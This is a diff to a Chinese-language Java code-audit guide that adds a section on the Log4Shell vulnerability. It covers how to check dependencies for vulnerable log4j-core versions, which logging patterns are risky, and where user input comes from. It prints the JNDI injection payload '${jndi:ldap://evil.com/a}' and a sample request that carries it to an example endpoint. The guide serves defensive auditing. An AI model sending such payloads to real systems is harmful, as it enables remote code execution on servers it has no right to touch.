@@ -1160,7 +1160,95 @@ public class JwtTokenAdminInterceptor implements HandlerInterceptor {
 
 >对于一些值得细讲的工具类，之后我找到好的样例后，会在这一小节之中进行拓展。也欢迎各位大佬提供一些有趣的样例。 
 
-#### 3.6 Controller 层业务审计（用户可访问的接口入口）
+### 3.6 Controller 层业务审计（用户可访问的接口入口）
+
+
+### 3.7 一些典型的，值得一提的方向
+
+#### 3.7.1 log4j
+
+谈到 Log4j 漏洞（Log4Shell），一个很容易被误解但**非常关键的点**是：
+
+❗*漏洞存在于 **log4j-core** 中，而不是 log4j-api*
+
+**第一步：看依赖里有没有 `log4j-core` ，在 Maven 项目中，先看依赖树：**
+```bash
+mvn dependency:tree -Dincludes=log4j
+````
+重点关注：是否存在 `log4j-core`，以及版本是多少。另外不只是关注开发者自己引入的依赖，还要关注通过依赖链引入的。
+
+版本判断（是否存在漏洞）
+
+| 版本                | 风险       |
+| ----------------- | -------- |
+| `< 2.15.0`        | 高危（Log4Shell） |
+| `2.15.0 ~ 2.16.0` | 仍有问题     |
+| `>= 2.17.0`       | 安全       |
+
+👉 因此：只有在 **存在 log4j-core 且版本较低时，风险才真正存在**
+
+✳️ **几个容易误判的地方**
+- 只有 log4j-api，不算使用 log4j ，没有漏洞
+```text
+log4j-api:2.x.x
+```
+- 出现 log4j-to-slf4j，只是桥接（把 log4j 日志转发到其他框架，比如 logback），也不算真正使用 log4j
+```text
+log4j-to-slf4j
+```
+
+🚩 **如果存在漏洞版本**
+
+当发现，例如：
+```text
+log4j-core:2.14.1
+```
+这时候才需要进一步分析漏洞是否会被利用
+
+并不是有漏洞就一定能打（当然即便不能够打，也值得升级依赖，否则后续更新功能依旧可能引入能够打地漏洞），关键看：
+
+> 用户输入是否进入 logger，并且未经过安全处理
+
+🔍 **重点关注点**：用户输入来源是否直接拼接到日志中，例如
+
+* HTTP 请求参数（query / body）
+* Header（User-Agent / X-Forwarded-For 等）
+* 表单输入
+* 文件内容
+* 数据库字段（⚠️ 很容易忽略，可能用户输入，先通过HTTP请求参数进入数据库，在后续的查询之中有作为输入进入logger）
+
+危险写法例如：
+
+```java
+logger.info("user input: " + userInput);
+```
+或：
+```java
+logger.error("error: {}", userInput);
+```
+👉 如果 `userInput` 可控，就有风险
+
+典型 payload：
+
+```text
+${jndi:ldap://xxx.com/a}
+```
+如果能进入日志系统并被解析，就可能触发远程加载
+
+一个更具体一点的例子
+```java
+@GetMapping("/test")
+public String test(String name) {
+    logger.info("user: " + name);
+    return "ok";
+}
+```
+如果访问：
+```text
+/test?name=${jndi:ldap://evil.com/a}
+```
+在存在漏洞版本的 log4j-core 下，就可能被利用
+
 
 
 
